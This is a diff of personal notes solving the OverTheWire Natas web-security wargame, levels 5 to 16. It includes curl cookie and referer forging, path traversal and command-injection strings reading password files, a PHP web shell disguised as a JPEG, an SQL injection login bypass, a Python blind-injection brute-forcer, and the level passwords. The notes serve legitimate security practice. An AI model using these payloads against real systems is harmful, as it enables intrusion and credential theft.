@@ -28,7 +28,7 @@ natas4
 QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
 ```
 ## Natas5
-```
+```shell
 curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org
 
 natas5
@@ -39,18 +39,19 @@ natas5
 Cookie: loggedin=1
 or
 curl -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK -b loggedin=1 http://natas5.natas.labs.overthewire.org/
+
 natas6
 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
 ```
 ## Natas7
-```
+```shell
 includes/secret.inc
 natas7
 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
 ```
 ## Natas8
 
-```
+```shell
 index.php?page=/etc/natas_webpass/natas8
 natas8
 xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
@@ -73,7 +74,7 @@ natas9
 ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
 ```
 ## Natas10
-```
+```shell
 ;ls -la;
 ;cat /etc/natas_webpass/natas8;
 natas10
@@ -81,7 +82,7 @@ t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
 ```
 ## Natas11
 - BAN || && ;
-```shel 
+```shell 
 -> try &(ls) -> idk but not exec
 -> .* # -> grep -i .* # -> cat exec
 -> `.* /etc/natas_webpass/natas11 #
@@ -109,28 +110,28 @@ natas12
 yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
 ```
 ## Natas13
-```
+```shell
 upload file trigger .php -> whell shell
 RCE cat cat /etc/natas_webpass/natas13;
 natas13
 trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
 ```
 ## Natas14
-```
+```shell
 bypass file header image 
 echo -e "\xFF\xD8\xFF\xE0<?php system(\$_GET['cmd']); ?>" > image.php
 natas14
 z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
 ```
 ## Natas15
-```
+```shell
 username=1"+OR+"1"+%3d+"1"+%23&password=a
 natas15
 SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
 ```
 ## Natas16
 - Boolean SQLi
-```
+```shell
 - TRUE = This user exists.
 - FASLE = This user doesn't exist.
 ```
@@ -190,51 +191,35 @@ needle=%24%28sleep+10s%29
 ```
 
 - I have a atkack vector with grep cmd and behavior of server
-```
+```shell
 $(grep ^(pass_char) /etc/natas_webpass/natas17)
 ```
 - this cmd will check string start with pass_char in file -> i can brute fore
-```
+```shell
 $(grep ^(pass_char) /etc/natas_webpass/natas17)cools
 ```
 - if cools not in reponse -> i found a char in pass
 
-```
+```python
 import requests
 burp0_headers = {
 
     "Authorization": "Basic bmF0YXMxNjpoUGtqS1l2aUxRY3RFVzMzUW11WEw2ZURWZk1XNHNHbw==",
-
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
-
 }
 
 filteredchars = ''
-
 password = ''
-
 allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
 
-  
-
 for x in range(32):
-
     for char in allchars:
-
         injection = password + char
-
         url = f"http://natas16.natas.labs.overthewire.org/?needle=$(grep ^{injection} /etc/natas_webpass/natas17)cools"
-
         rq = requests.get(url, headers=burp0_headers)
-
-  
-
         if 'cools' not in rq.text:
-
             password += char
-
             print(password)
-
             break
 #EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
 ```
